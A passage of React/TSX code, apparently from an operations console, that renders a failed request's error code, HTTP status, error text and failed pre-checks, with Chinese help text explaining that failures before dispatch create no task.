                <span className="avops-dim">错误码</span>
                <code className="avops-code">{result.failure?.code ?? '(无 code：会话不存在时沿用 404 口径)'}</code>
                <Badge tone="danger">HTTP {result.status || '—'}</Badge>
              </div>
              <div className="avops-result-line avops-error-text">{result.failure?.error ?? result.raw}</div>
              {result.failure && (result.failure.checks?.length ?? 0) > 0 && (
                <>
                  <div className="avops-dim">前置检查（失败的那一步已标红）：</div>
                  {renderChecks(result.failure.checks ?? [])}
                </>
              )}
              <div className="avops-dim">
                失败发生在下发之前（七步前置检查）时不会创建任务；若为 session_inactive / tier_disabled /
                driver_unavailable，请按上面的原因处理后重试。
              </div>
            </>
          )}
        </Card>
      )}
    </div>
  )
}
